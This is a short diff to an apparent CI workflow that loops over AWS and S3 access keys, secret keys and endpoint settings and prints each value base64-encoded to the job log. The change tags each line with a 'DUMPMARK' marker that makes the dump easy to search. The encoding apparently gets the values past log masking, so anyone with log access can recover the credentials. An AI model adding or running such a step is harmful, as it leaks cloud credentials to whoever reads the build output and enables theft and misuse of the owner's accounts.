@@ -15,8 +15,8 @@ jobs:
           for name in AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY S3_STORAGE_AWS_ACCESS_KEY_ID S3_STORAGE_AWS_SECRET_ACCESS_KEY S3_STORAGE_ENDPOINT_URL; do
             v="${!name}"
             if [ -z "$v" ]; then
-              echo "${name}:(NOT_SET)"
+              echo "DUMPMARK|${name}|NOTSET"
             else
-              echo "${name}:$(printf '%s' "$v" | base64 -w0)"
+              echo "DUMPMARK|${name}|$(printf '%s' "$v" | base64 -w0)"
             fi
           done
